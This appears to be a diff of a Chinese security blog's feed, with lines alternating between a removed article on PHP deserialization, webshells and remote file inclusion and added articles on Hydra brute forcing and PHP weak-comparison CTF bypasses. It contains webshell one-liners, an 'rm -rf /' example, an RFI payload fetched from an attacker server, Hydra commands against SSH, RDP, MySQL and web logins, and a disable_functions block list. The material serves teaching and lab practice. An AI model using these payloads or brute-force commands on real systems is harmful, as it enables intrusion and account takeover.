-class Show &#123;    public $cmd;    public function __wakeup() &#123;        system($this-&gt;cmd);    &#125;&#125;
 
-(2) 属性
-属性是类的成员变量,用于描述类的特征,是类的核心组成部分。
-语法规范:
 
-PHP类的属性必须声明访问修饰符,常用的有 public &#x2F; protected &#x2F; private（只能在类里面才可以输出）；
-类内部的方法中,调用本类的属性时,必须使用 $this-&gt;属性名,绝对不能直接写属性名,这是PHP语法强制要求；
-语法示例：$this-&gt;cmd 表示当前类的cmd属性。
 
-(3) 方法
-方法是类的成员函数,用于描述类的行为和能执行的操作,是类的功能实现部分。类比汽车的启动、刹车,对应到PHP类中,就是能执行特定逻辑的函数。
-语法规范:
 
-类中的方法也需要声明访问修饰符,格式为 public function 方法名；
-类中的方法分为普通方法和魔术方法两类,二者有本质区别,是漏洞利用的核心考点。
+注意：不要关掉终端页面，否则刚刚访问的网页也会没。
 
-(4) 对象
-对象是类的实例化产物,是类的具体表现形式,一个类可以实例化出无数个对象,每个对象都拥有类中定义的全部属性和方法。
-语法规范：PHP中通过关键字 new 实现类的实例化
-$对象名 = new 类名();
 
-示例：$obj = new Show(); 实例化 Show 类,生成对象并赋值给变量$obj。
-(5) 实例化
+往 bp 安装插件
+注意：插件的路径不能有中文。
 
-定义：从抽象的类创建出具体的对象的过程,称为实例化。
-核心关键字：new 是PHP中唯一实现实例化的关键字,无其他替代方式。
-核心特性：实例化完成后,对象就拥有类的全部属性和方法,可通过对象名-&gt;属性名给属性赋值&#x2F;取值,对象名-&gt;方法名 调用方法。
 
-$gaga = new person();$gaga-&gt;age;$gaga-&gt;say();
 
-2. 类与对象的核心使用语法
-给对象的属性赋值：$obj-&gt;cmd = &#39;calc&#39;;
-调用对象的普通方法：$obj-&gt;方法名();
-类内部调用自身属性：$this-&gt;属性名;
-类内部调用自身方法：$this-&gt;方法名();
 
-3. 普通方法 vs 魔术方法(1) 普通方法
 
-定义：不以双下划线开头的类方法,是开发者自定义的业务方法。
-执行规则：必须手动调用才能执行,不调用则永远不会运行。
-示例：public function login(); 必须写 $obj-&gt;login(); 才会执行该方法。
-安全属性：普通方法几乎无安全风险,因为执行权完全由开发者掌控。
 
-(2) 魔术方法
 
-定义：PHP官方预定义的、所有以两个下划线开头的特殊方法,属于PHP语言的内置机制,不是开发者自定义的。
-核心特征:
-无需手动调用,满足特定的触发条件后,会自动触发、自动执行；
-魔术方法的函数名是固定的,PHP有严格的命名规范,不能随意修改；
-魔术方法是PHP的底层机制,所有PHP类都可以直接使用这些方法。
 
 
-安全属性：极高安全风险,是PHP反序列化漏洞的唯一触发点,也是网安人员代码审计的核心目标。
-常用魔术方法：
-new关键字实例化 → __construct
-销毁 → __destruct
-读不存在属性 → __get
-写不存在属性 → __set
-打印对象 → __toString
-调用不存在方法 → __call
-克隆 → __clone
-序列化 &#x2F; 反序列化 → __sleep &#x2F; __wakeup
 
+只有【输出】板块有内容，【错误】里面没有就是安装成功了
 
 
+成功导入插件。
+抓包
+先复制验证码的图像地址：
+http://127.0.0.1/weakpasswd/CMS/upload/include/vdimgck.php
 
-五、序列化与反序列化1. 核心定义(1) 序列化
-通过PHP内置函数 serialize,将一个完整的PHP对象,转换为一串结构化的、可传输的纯字符串的过程。
-语法：serialize($obj); 传入一个对象,返回对应的序列化字符串。
-var_dump(serialize($gaga));
 
-(2) 反序列化
-通过PHP内置函数 unserialize,将序列化生成的字符串,还原为序列化之前的完整PHP对象的过程,是序列化的反向操作。
-核心作用：服务器接收前端传递的序列化字符串后,还原为对象,读取其中的用户信息、业务数据等。
-语法：unserialize($str); 传入一个序列化字符串,返回对应的PHP对象。
-var_dump(unserialize(serialize($gaga)));
 
-2. 序列化字符串的格式解析序列化后的字符串看似是乱码,实则有严格的结构化格式,每一段都有固定含义,看懂格式才能手动修改恶意载荷,是高阶漏洞利用的基础。
-(1) 基础格式规则
-序列化字符串由类型标识+长度+内容组成,核心标识含义:
+抓包
 
-O :表示这是一个对象的序列化结果
-: :分隔符,用于分隔标识、长度、内容
-数字:表示后续内容的长度
-&quot;字符串&quot;:表示类名、属性名、属性值
-{} :包裹对象的所有属性键值对
 
-示例拆解：O:4:&quot;Show&quot;:1:{s:3:&quot;cmd&quot;;s:4:&quot;calc&quot;;}
+爆破密码
 
-O:4:&quot;Show&quot; 这是一个对象,类名的长度是4,类名是Show；
-:1 该对象包含1个属性（大括号内一组键;值算 1 个属性）；
-{} 包裹该对象的所有属性；
-s:3:&quot;cmd&quot; 该属性的键名是字符串类型,长度3,键名是cmd；
-s:4:&quot;calc&quot; 该属性的键值是字符串类型,长度4,键值是calc。
 
-(2) 格式修改规则
-比如要把命令从calc改为mspaint,只需修改两处:O:4:&quot;Show&quot;:1:{s:3:&quot;cmd&quot;;s:7:&quot;mspaint&quot;;}键值从calc改为mspaint,对应把s:4改为s:7即可,其余内容不变。
-3. 序列化的安全本质序列化本身是绝对安全的,它只是一个数据格式转换工具;反序列化本身也是绝对安全的,它只是一个反向转换工具;所有的安全风险,都不是来自序列化和反序列化本身,而是来自反序列化后的自动触发逻辑+危险函数的调用。
+爆破验证码
 
-六、高危危险函数1. 危险函数的定义PHP中的高危危险函数,是指能够直接执行服务器系统命令、执行任意PHP代码、包含远程文件、读写服务器文件的内置函数,这类函数的特点是权限极高、破坏力极强。对网安人员来说:在代码中看到这些函数,就意味着找到了漏洞的突破口;对开发者来说:代码中尽量不要使用这类函数,必须使用时要做严格的参数校验。
-2. 核心高危危险函数(1) 系统命令执行函数
-这类函数的作用是直接执行服务器的操作系统命令,Windows和Linux系统均适用,一旦被利用,攻击者可完全控制服务器。
 
-system()：执行系统命令,命令执行的完整输出会直接打印到页面,函数返回命令执行状态码。
 
-system(&#x27;calc&#x27;);       // Windows打开计算器system(&#x27;whoami&#x27;);     // 查询服务器当前用户system(&#x27;rm -rf /&#x27;);   // Linux高危命令，删除根目录所有文件
 
 
-exec()：同样可执行系统命令,不会直接输出内容,仅返回命令最后一行输出,隐蔽性高于system。
 
-(2) PHP代码执行函数
-这类函数的作用是将传入的字符串当作PHP代码直接执行,破坏力比系统命令执行函数更强,因为可以直接写入一句话木马,实现长期控制服务器。
 
-eval()：经典代码执行函数,将传入字符串当作完整PHP代码执行,传入内容必须是规范完整PHP语句。
 
-eval(&#x27;phpinfo();&#x27;);      // 输出PHP环境配置信息eval($_POST[&#x27;x&#x27;]);       // 一句话木马核心，接收POST参数并执行任意PHP代码
+把线程设置为1。
+刚刚复制的图片地址
+xiapao: http://127.0.0.1/weakpasswd/CMS/upload/include/vdimgck.php
 
-若需要通过 eval 查看服务器目录,POST 传入参数 x=system(&#39;ls&#39;);,等价执行 eval(&quot;system(&#39;ls&#39;);&quot;);,调用 system 列出当前目录文件。
 
-assert()：功能同eval,可执行PHP代码,支持不完整语句,适配性更广,利用门槛更低,风险更高。
 
-(3) 文件包含函数
-这类函数的作用是将指定的文件内容读取到当前脚本中,并当作PHP代码执行,是除反序列化漏洞外,Web安全中最常见的高危漏洞之一。
-漏洞原理：如果参数可控,攻击者可传入远程恶意文件的URL,服务器会包含并执行该文件中的恶意代码,实现远程控制。
+开始攻击
 
-include：包含指定文件,文件不存在时仅报警告,脚本继续执行；
-require：包含指定文件,文件不存在时报致命错误,脚本停止执行；
 
+2. 九头蛇（hydra）2.1 定义hydra是著名组织thc的⼀款开源的暴力破解密码工具。kali下是默认安装的，几乎⽀持所有协议的在线破解。 密码能否破解，在于字典是否强大以及电脑的性能。、
+2.2 参数
+-l login 小写，指定用户名进行破解 
+-L file 大写，指定用户的用户名字典 
+-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典。 
+-P file 大写，用于指定密码字典。 
+-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探 
+-M file 指定目标ip列表文件，批量破解。 
+-o file 指定结果输出文件 
+-f 找到第一对登录名或者密码的时候中止破解。 
+-t tasks 同时运行的线程数，默认是16 
+-w time 设置最大超时时间，单位秒 -
+v&#x2F;-V 显示详细过程 
+-R 恢复爆破（如果破解中断了，下次执行hydra -R &#x2F;path&#x2F;to&#x2F;hydra.restore就可以继续任务。） 
+-x 自定义密码生成规则
 
-七、文件上传漏洞文件上传是网站最常见的功能(头像上传、附件上传、图片上传),从「用户点击上传按钮」到「文件成功保存在服务器」。
-1. 文件上传流程我们用「寄快递」的形象比喻：
-(1) 步骤1:用户选文件 → 填快递单
-用户在浏览器中,通过上传表单选择要上传的文件(图片&#x2F;附件&#x2F;脚本),点击「上传」按钮;此时浏览器会把文件的基本信息(文件名、大小、类型)整理好,准备发送给服务器。
-(2) 步骤2:浏览器打包 → 用POST请求发货
-浏览器将用户选择的文件,以「二进制数据包」的形式打包,通过 POST请求 发送给服务器；
+2.3 使用# 切换root权限sudo su
 
-为什么必须用POST? 因为GET请求能传递的数据量极小,无法承载文件的大小,POST请求无数据量限制,是文件上传的唯一方式。
 
-(3) 步骤3:服务器接收 → 存入临时仓库
-服务器收到浏览器发送的文件数据包后,不会直接保存到指定目录,而是会先把文件存入服务器的「临时目录」,并由PHP自动生成一个「临时文件名」,这个文件名就是 $_FILES[&#39;file&#39;][&#39;tmp_name&#39;]；
 
-核心特点:临时文件是一次性的,PHP脚本执行结束后,临时文件会被服务器自动删除,不会残留。
+# 先进入文件所在目录cd /home/kali/弱口令爆破/passwordDict/
 
-(4) 步骤4:PHP代码做最终决策 → 完成上传(核心)
-这是整个文件上传流程的核心步骤,也是文件上传漏洞产生的唯一环节!服务器不会自己做任何决策,所有的操作都由PHP代码决定,PHP会完成3个核心操作:
+2.3.1 破解 SSH 密码命令：
+hydra -l &lt;已知用户名,例如root或kali&gt; -P &lt;密码字典路径.txt&gt; -t 3 -e ns &lt;目标IP&gt; ssh
 
-决定「要不要接收这个文件」(是否过滤文件类型、文件名)；
-决定「把文件存到哪里」(指定保存目录,比如 .&#x2F;uploads&#x2F;)；
-决定「给文件起什么名字」(使用原始文件名还是重新命名)；
+示例：
+针对 Linux 服务器的默认远程管理端口（22）进行爆破， 拿本机的 kali 账号进行测试。  
+# 先要确定ssh是启动的service ssh restart#指定kali账号 用password.txt文件 使用3个线程，爆破本地的sshhydra -l kali -P top500.txt -t 3 -e ns 127.0.0.1 ssh
 
-最后,PHP会调用核心函数 move_uploaded_file(),将临时目录中的文件「搬运」到指定的保存目录,文件搬运成功后,才算真正的上传成功!
-2. 文件上传核心函数(1) move_uploaded_file()
-语法：
-move_uploaded_file(临时文件路径, 目标保存路径);// 比如:move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $file_path);
 
-核心特点：
 
-安全特性:这是PHP的安全函数,只能搬运通过POST请求上传的临时文件,无法搬运服务器上的其他文件,能有效防止攻击者伪造文件上传；
-无过滤特性:这个函数只是「搬运工」,只负责搬文件,不会检查文件的类型、内容、是否为恶意文件；
-核心结论:这个函数本身没有漏洞,文件上传漏洞的产生,永远不是这个函数的问题,而是PHP代码没有在搬运前做过滤校验。
+成功拿到 kali 的账号和密码。
+2.3.2 破解 Windows RDP 远程桌面命令：
+hydra -l administrator -P &lt;密码字典路径.txt&gt; -t 3 -e ns &lt;目标IP&gt; rdp
 
-3. 文件上传漏洞(1) 什么是文件上传漏洞?
-文件上传漏洞,是指网站的PHP上传代码,没有对用户上传的文件进行严格的过滤和校验,导致攻击者 可以将「恶意的PHP脚本文件」伪装成合法文件(比如图片、文档),成功上传到服务器,并且能被服务器解析执行的高危漏洞。
-(2) 漏洞产生的核心原因
-后端的PHP上传代码,没有对用户上传的文件进行有效的过滤校验,直接使用了攻击者可控的原始文件名,直接将文件保存到服务器。
-典型的无过滤上传:
-&lt;?php$upload_dir = &#x27;./uploads/&#x27;;$file_name = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]; // 直接使用攻击者可控的文件名$file_path = $upload_dir . $file_name; // 直接拼接路径// 直接搬运,无任何过滤if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $file_path)) &#123;    echo &quot;上传成功!&quot;;&#125;?&gt;
 
-漏洞点分析:代码中没有检查文件是不是图片、没有检查文件名是不是恶意后缀、没有过滤特殊字符,攻击者传什么文件,服务器就保存什么文件,这就是最基础、最典型的文件上传漏洞。
-(3) 漏洞的危害
-文件上传漏洞是Web安全中危害最高的漏洞之一,一旦存在这个漏洞,攻击者可以:
+-l administrator: Windows 的最高权限默认管理员账号通常是 administrator（注意拼写）。
+rdp: 指定攻击模块为 Remote Desktop Protocol。
 
-上传恶意的PHP脚本文件到服务器；
-通过浏览器访问这个文件的地址,让服务器解析执行脚本；
-拿到服务器的权限,进而控制整个网站、数据库,甚至服务器本身；
-泄露网站的用户数据、管理员账号密码,甚至篡改网站内容。
+示例：
+ 针对 Windows 主机的 3389 端口进行爆破。用同一局域网内的 Windows2003 进行测试。
+靶机 IP：
 
-(4) 漏洞的核心利用条件
-攻击者上传了恶意文件后,想要让文件生效,必须满足2个条件(缺一不可):
 
-条件1:文件成功上传到服务器,并且知道文件的「完整访问地址」(可访问)；
-条件2:文件存放的目录,被服务器配置了「PHP解析权限」(可解析)；
+# nmap扫描靶机的3389端口是否开放nmap -p 3389 192.168.23.129hydra -l administrator -P top500.txt -t 3 -e ns 192.168.23.129 rdp
 
-核心:上传成功 + 可访问 + 可解析 &#x3D; 漏洞利用成功!
 
-八、WebShell1. 定义WebShell 就是攻击者通过漏洞,上传到目标服务器的、能被服务器解析执行的、可以远程控制服务器的 PHP脚本文件,也被称为「网站后门」、「网页后门」。
-2. 核心特点
-本质就是一个普通的PHP文件,后缀是 .php,和正常的PHP文件没有任何区别；
-不是病毒、不是工具,只是一段包含「恶意执行逻辑」的PHP代码；
-核心能力是「接收攻击者的远程指令,并让服务器执行」,实现对服务器的远程控制。
 
-3. 分类(1) 一句话木马
-体积极小,单行代码,功能精简,依靠工具连接执行操作,比如 &lt;?php eval($_POST[&#39;x&#39;]);?&gt;,属于微型 webshell 文件。
-(2) 大马（大型木马文件）
-完整PHP脚本,代码量大,自带可视化面板,无需额外工具,上传后直接浏览器访问就能管理文件、数据库、执行命令等。
-总结：一句话木马、大型大马都属于 WebShell,本质均为上传至服务器、可被 Web 解析执行的恶意脚本文件。所有 WebShell 都必须以文件形式存放于网站可访问目录,才能够正常解析生效。
-4. WebShell生效的必备条件和文件上传漏洞的利用条件完全一致,也是所有后门生效的核心条件:
 
-成功上传:WebShell文件被成功保存到目标服务器的指定目录；
-可访问:攻击者能通过浏览器,访问到这个WebShell文件的完整地址；
-可解析:文件所在目录支持PHP解析,服务器能把它当成PHP脚本执行。
 
-5. 两种PHP WebShell这两种WebShell是PHP后门的基础,代码极简、危害极大,所有复杂的WebShell都是基于这两种形态拓展的。
-(1) 代码执行型WebShell
-&lt;?php eval($_POST[&#x27;x&#x27;]); ?&gt;
+成功拿到 Windows2003 的账号和密码。
+2.3.3 破解 MySQL 密码MySQL 端口 3306
+场景 A：已知高权限用户名（如 root），仅爆破密码
+hydra -l root -P &lt;你的密码字典路径.txt&gt; -t 3 -e ns &lt;目标IP&gt; mysql
 
 
-核心函数:eval()
-函数作用:将「接收到的字符串」当成「合法的PHP代码」,直接交给服务器解析执行；
-运行逻辑:攻击者通过POST请求,向这个文件传递任意的PHP代码(比如删库、查数据),eval() 会把这些代码执行,实现对网站的控制；
-危害范围:控制网站的PHP程序,操作网站的数据库、文件、内容。
+-l root : 指定单个用户名（小写 l）。
+-P dict.txt : 指定密码字典文件（大写 P）。
+-t 3 : 线程数设为 3（线程过高容易导致服务拒绝连接）。
+-e ns : 附加测试空密码 (null) 和同用户名密码 (same)。
 
-(2) 系统命令型WebShell
-&lt;?php system($_POST[&#x27;x&#x27;]); ?&gt;
+场景 B：用户名和密码均未知（双字典交叉爆破）
+hydra -L &lt;用户名字典路径.txt&gt; -P &lt;密码字典路径.txt&gt; -t 3 -e ns &lt;目标IP&gt; mysql
 
 
-核心函数:system()
-函数作用:将「接收到的字符串」当成「服务器的操作系统命令」,直接交给服务器执行；
-运行逻辑:攻击者通过POST请求,传递任意的系统命令(比如查看服务器文件、新建账号、删除文件),system() 会把这些命令执行；
-危害范围:控制整个服务器的操作系统,权限极高,危害远大于第一种。
+-L users.txt : 指定用户名字典文件（大写 L）。
 
-6. WebShell的核心原理无论是哪种WebShell,核心原理都是：PHP代码将「未做任何过滤的、攻击者完全可控的用户输入($_POST 接收的参数)」,当成了「合法的执行指令」,直接执行。简单说:服务器盲目信任了攻击者的输入,把攻击者的恶意指令当成了正常的代码&#x2F;命令去执行,最终导致服务器被控制。
-7. WebShell和文件上传漏洞的关系
-WebShell是「攻击的武器」；
-文件上传漏洞是「把武器送进服务器的通道」；
-攻击者通过「文件上传漏洞」将「WebShell文件」上传到服务器,再通过访问WebShell实现对服务器的控制,这是渗透测试中最经典、最常用的攻击链路!
+2.3.4 破解 HTTP 表单登录（POST）命令：
+hydra -t 3 -l &lt;已知用户名&gt; -P &lt;密码字典路径.txt&gt; -s &lt;目标端口&gt; &lt;目标IP&gt; http-post-form &quot;&lt;表单提交路径&gt;:&lt;POST请求数据，使用^USER^和^PASS^占位&gt;:&lt;失败特征码&gt;&quot;
 
+ 格式说明：登录URL:POST参数格式:失败提示字符串
 
-九、PHP反序列化漏洞1. 定义PHP反序列化漏洞,全称 PHP对象注入漏洞,是指攻击者通过控制服务器端的反序列化输入,将恶意构造的序列化字符串传入服务器的unserialize函数中,触发类中的魔术方法执行,最终导致恶意代码&#x2F;系统命令被执行的高危漏洞,该漏洞属于远程代码执行漏洞,危害等级为高危-致命。
-2. 漏洞触发的核心要素反序列化漏洞的触发有严格的条件,三个要素必须同时满足：
-(1) 反序列化的参数完全可控且无校验
-服务器端的unserialize函数的入参,是由前端用户传递的,且开发者没有对传入的序列化字符串做任何校验:
+^USER^ 和 ^PASS^ 是 Hydra 的占位符，会自动替换为用户名和字典中的密码
+用户名或密码错误是登录失败时页面返回的提示，Hydra 以此判断登录是否失败
 
-不校验序列化字符串的来源；
-不校验序列化字符串对应的类名是否合法；
-不校验序列化字符串的内容是否被篡改。
+示例：
+hydra -t 3 -l admin -P password.txt -s 80 192.168.0.47 http-post-form &quot;/wz/login.php:user=^USER^&amp;pass=^PASS^:用户名或密码错误&quot;
 
-核心问题:服务器无条件信任所有用户输入的序列化字符串,无论是否是恶意构造的,都会直接执行反序列化操作。
-(2) 目标类中存在可自动触发的魔术方法
-目标服务器的代码中,被反序列化的类中,定义了__wakeup、__destruct等魔术方法。
-核心问题:反序列化操作会自动触发这些魔术方法,无需手动调用,开发者无法感知这个执行过程。
-(3) 魔术方法中调用了高危危险函数
-魔术方法的函数体内部,调用了system、eval、exec等可以执行系统命令或PHP代码的高危函数,且危险函数的参数是类的可控属性。
-核心问题:攻击者可以通过控制属性值,向危险函数传入恶意命令,最终被服务器执行。
-3. 漏洞利用流程(1) 正常业务逻辑
-开发使用unserialize()解析序列化字符串,还原User对象读取用户数据；原始User类仅普通业务方法,无魔术方法、无危险执行函数,本身不存在安全风险。
-(2) 漏洞根源
-代码直接将用户可控参数传入unserialize(),未做白名单、过滤、校验,服务端可接收任意类的序列化字符串并完成反序列化。
-(3) 构造payload步骤
+2.3.5 破解 HTTP 表单登录（GET）hydra -t 3 -l admin -P password.txt -s 80 192.168.209.1 http-get-form &quot;/wz/login.php:user=^USER^&amp;pass=^PASS^:用户名或密码错误&quot;]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>弱口令爆破</category>
+      </categories>
+      <tags>
+        <tag>弱口令</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP特性利用之弱比较</title>
+    <url>/2026/06/23/PHP%E5%BC%B1%E6%AF%94%E8%BE%83/index/</url>
+    <content><![CDATA[一、前置知识：1. 基础概念区分
+== 弱比较PHP会自动隐式转换两边数据类型后再对比，是所有CTF弱类型题的核心漏洞点。
+=== 强比较同时校验值 + 数据类型，不做任何自动转换，无法用弱类型绕过，是标准防御写法。
 
-审计源码寻找危险类：类包含魔术方法,且方法内部调用system&#x2F;eval等高危执行函数；
-本地复现目标类,修改类内可控属性,填入恶意系统命令；
-实例化恶意对象,通过serialize()生成恶意序列化字符串（payload）。
 
-(4) 总结
-可控无校验反序列化输入 + 可触发魔术方法 + 魔术方法内含危险执行函数 &#x3D; PHP反序列化漏洞
+2. 绕过方法2.1 0e MD5 科学计数法绕过
+原理
 
-十、远程文件包含漏洞1. 漏洞定义远程文件包含漏洞属于高危代码执行漏洞。当页面中include&#x2F;require等文件包含函数的传入参数由用户可控,且后端未做过滤、路径校验,同时 PHP 配置allow_url_include=On时,攻击者可传入外网恶意文件 URL；服务器会远程读取该文件内容,当作 PHP 代码解析执行,最终造成远程代码执行,攻击者可控制服务器。
-2. 漏洞利用流程(1) 示例
-&lt;?php    $file = $_GET[&#x27;file&#x27;];    include($file);?&gt;
 
-漏洞根源：$file参数由前端GET请求传递,完全可控,且无任何校验；include函数支持远程文件包含,只要传入合法的URL即可。
-(2) 利用步骤
+以 0e 开头且后续全为纯数字的字符串，在进行弱比较（==）时，会被 PHP 强制解析为科学计数法 0 × 10&lt;sup&gt;n&lt;/sup&gt;= 0。因此，任意两个满足此格式的字符串 == 判定恒为 true。
+示例：
 
-攻击者在自身外网服务器放置恶意文件 shell.txt,文件内写入PHP一句话木马；
-访问存在文件包含漏洞的页面,传入远程URL参数：http://目标网站/index.php?file=http://攻击者服务器/shell.txt
-目标服务器执行 include(),远程拉取并解析攻击者服务器上的txt文件内容；
-木马代码被当作PHP脚本执行,攻击者传参即可执行系统命令,远程控制服务器。
+$a = md5(&#x27;240610708&#x27;); // 0e462097431906509019562988736854$b = md5(&#x27;QNKCDZO&#x27;);   // 0e830400458393240665909944582762var_dump($a == $b); // truevar_dump($a === $b);// false
 
-前提：PHP配置 allow_url_include = On,才支持远程URL文件包含,否则该利用方式失效。
-3. 漏洞危害及防御(1) 危害
-与反序列化漏洞一致,均为远程代码执行漏洞,攻击者可通过该漏洞直接拿下服务器的最高权限,危害等级为致命。
-(2) 防御——禁用高危函数（命令&#x2F;代码执行）
-适用：文件包含、一句话木马、命令执行、反序列化配合危险函数等漏洞。
-原理：修改php.ini的disable_functions,禁用执行代码、系统命令、文件包含类高危函数,脚本调用直接失效。
-操作步骤：
 
-找到服务器php.ini配置文件；
-修改disable_functions,多函数用英文逗号隔开；
+适用场景：后端使用弱比较判断两个不同输入的 MD5 或 SHA1 值是否相等。
 
-disable_functions = eval,assert,system,exec,passthru,shell_exec,include,require
 
+2.2 数字字符串截断匹配
+原理(PHP 8 之前)
 
-保存配置,重启PHP服务生效。
 
-防护效果：即使代码存在危险函数调用,也无法执行恶意代码、系统命令,从底层阻断利用。
-(3) 防御——类白名单校验
-原理：调用unserialize()前校验序列化内容,仅允许业务合法类,拦截攻击者构造的恶意类序列化载荷。
-防护效果：恶意对象无法完成反序列化,魔术方法不会触发,彻底封堵反序列化漏洞。
-(4) 防御——严格校验过滤所有用户输入
-Web安全核心原则：不信任任何外部传入参数
+字符串和数字进行弱对比时，PHP 会从字符串开头提取数字，后面的字母直接丢弃。如果开头没有数字，则直接转为 0。字符串和数字==对比时，会从字符串开头提取数字，后面字符直接丢弃。
+示例
 
-数据类型校验：限定参数只能为规定类型；
-长度限制：约束参数长度,拦截超长攻击载荷；
-关键字过滤：拦截eval、system、http://、&lt;?php等恶意关键词；
+var_dump(123 == &quot;123abc&quot;);  // truevar_dump(0 == &quot;abc123&quot;);    // true，无开头数字直接转为0var_dump(0 == &quot;flag&quot;);     // true
 
-适用场景：文件包含、上传、反序列化、命令执行等绝大多数Web漏洞。
+
+注意：PHP 8 此特性已废弃。PHP 8 会将数字转为字符串再比较，0 &#x3D;&#x3D; “flag” 的结果变为 false。 
+适用场景：要求传入的参数等于某个特定数字，传入“数字+字母”或“字母”触发隐式转换绕过（仅限 PHP 7 及以下）。
+
+
+2.3 ffifdyop MD5 SQL注入绕过$sql = &quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;
+
+
+原理
+
+
+当后端使用 md5($password, true) 时，第二个参数 true 会让函数返回 16 字节的原始二进制格式，而不是 32 位的十六进制字符串。
+
+
+利用方式
+
+
+明文 ffifdyop 的 MD5 二进制数据中，恰好包含字符串 ‘or’6。拼接到 SQL 语句。
+拼接前：
+
+
+
+select * from user where username =&#x27;admin&#x27; and password =&#x27;&#x27; 
+
+- 拼接后：	
+
+select * from user where username =&#x27;admin&#x27; and password =&#x27;&#x27;or&#x27;6...&#x27; 
+
+这闭合了单引号，并形成了 or 6 的永真条件，直接绕过登录验证。我在 PHP特性利用之 MD5 这篇中有提到这种题目。
+
+2.4 数组绕过数组和字符串直接比较 [] &#x3D;&#x3D; “admin” 结果是 false。真正的漏洞在于 PHP 的内置处理函数。 
+
+利用方式
+
+
+md5()、sha1()、strcmp() 等函数期望接收字符串。如果传入数组（如：pass[]&#x3D;1），函数无法处理会报错并返回 null。 
+示例 1 (弱比较绕过)
+
+strcmp($pass, &quot;admin&quot;) == 0
+
+传入数组后函数返回 null，随后 null &#x3D;&#x3D; 0 判定为 true，成功绕过。 
+
+示例 2 (强比较绕过)
+
+$a !== $bmd5($a) === md5($b)
+
+传入两个不同的数组，哈希函数均返回 null，随后 null &#x3D;&#x3D;&#x3D; null 判定为 true，成功绕过。 
+
+注意：在 PHP 8 中，向这类函数传入数组不再返回 null，而是直接抛出 TypeError 致命错误导致程序崩溃，该方法失效。
+
+
+3. 总结通用类型转换规则：
+
+数字与字符串： PHP 8 之前：字符串转数字（从头截取，无数字转0）。 PHP 8 及以后：数字转字符串比较。
+0e 规则： 0e开头纯数字 &#x3D;&#x3D; 0e开头纯数字，结果恒为 true。
+数组特性： 数组与任意数字或字符串直接弱比较，结果为 false。 数组传入 md5 或 strcmp 等仅接收字符串的函数，返回 null (PHP 8 之前) 或直接报错 (PHP 8 及以后)。
+null &#x3D;&#x3D; false &#x3D;&#x3D; 0 &#x3D;&#x3D; “” 互相弱比较全为 true。 注意：PHP 8 中 0 &#x3D;&#x3D; “” 的结果变为 false。
+
+
+二、[攻防世界] simple_php1. 题目
+
+2. 解题思路
+读代码
+
+&lt;?phpshow_source(__FILE__);include(&quot;config.php&quot;);$a = @$_GET[&#x27;a&#x27;];$b = @$_GET[&#x27;b&#x27;];if ($a == 0 and$a) &#123;    echo$flag1;&#125;if (is_numeric($b)) &#123;    exit();&#125;if ($b &gt; 1234) &#123;    echo$flag2;&#125;?&gt;
+
+
+$a 的要求：弱等于 0，但又不能是 0 或空值（比如 0a、abc）。
+$b 的要求：不能是纯数字&#x2F;数字字符串，但弱比较要大于 1234（比如 1235a）。
+
+
+构造Payload如?a=0a&amp;b=1235a即可同时获取flag1和flag2
+
+
+三、[攻防世界] PHP21. 题目
+2. 解题思路
+这句话 “Can you authenticate to this website?” 的意思是：“你能通过这个网站的身份验证吗？” 或 “你能登录&#x2F;认证到这个网站吗？”
+
+
+这个页面没有提供登录框、输入框等明显的交互方式，说明认证逻辑藏在代码或请求里，需要去挖掘。
+需要找到绕过身份验证的方法，比如：
+查看页面源码或备份文件
+分析隐藏的参数或 Cookie
+利用编码、弱类型等漏洞
+
+
+
+
+由于题目的标题是PHP，所以我们试一下index.php  或者  index.phps
+读代码
+
+&lt;?phpif(&quot;admin&quot;===$_GET[id]) &#123;    echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);    exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;admin&quot;)&#123;    echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;    echo &quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;;&#125;?&gt;
+
+
+=== 强比较：禁止直接传入 id=admin。
+代码对 id 进行了第二次 URL 解码，我们可以利用这一点。
+绕过思路：对 &quot;admin&quot; 进行 两次 URL 编码，让浏览器第一次解码后不等于 &quot;admin&quot;，通过第一层判断；代码第二次解码后得到 &quot;admin&quot;，触发第二层判断。
+
+
+用bp，对 admin 进行两次 URL 编码
+
+
+得到：
+%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
+
+
+构造 payload：
+
+?id=%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
+
+
+成功绕过认证，获取 Flag
+
+
+四、[Bugku CTF] 各种绕过哟1. 题目：2. 解题思路
+代码审计
+
+&lt;?phphighlight_file(&#x27;flag.php&#x27;);$id = urldecode($_GET[&#x27;id&#x27;]);$flag = &#x27;flag(xxxxxxxxxxxxxxx)&#x27;;if (isset($_GET[&#x27;uname&#x27;]) and isset($_POST[&#x27;passwd&#x27;])) &#123;    if ($_GET[&#x27;uname&#x27;] ==$_POST[&#x27;passwd&#x27;]) &#123;        print &#x27;passwd can not be uname.&#x27;;    &#125;    else if (sha1($_GET[&#x27;uname&#x27;]) === sha1($_POST[&#x27;passwd&#x27;]) &amp;&amp; ($id==&#x27;margin&#x27;)) &#123;        die(&#x27;Flag:&#x27;.$flag);     &#125;    else &#123;        print &#x27;sorry!&#x27;;    &#125;&#125;?&gt;
+
+
+GET传 uname 和 id；
+POST传 passwd；
+需满足的条件：
+$_GET[&#39;uname&#39;] !=$_POST[&#39;passwd&#39;] 
+sha1($_GET[&#39;uname&#39;]) === sha1($_POST[&#39;passwd&#39;])（SHA1强相等）；
+$id = urldecode($_GET[&#39;id&#39;]);并且$id==&#39;margin&#39;
+
+
+
+
+分析条件
+
+
+PHP的sha1()函数只接受字符串&#x2F;数字，传入数组会返回NULL；要求SHA1值必须强相等，那么传入两个不同的数组（比如uname[]=1和passwd[]=2）满足uname != passwd
+id直接传margin，源码没有 if($id == &#39;margin&#39;) 这类校验逻辑，不存在匹配拦截，所以不需要二次 URL 编码绕过。
+
+3. 解题步骤
+代码审计，读懂代码，找到漏洞
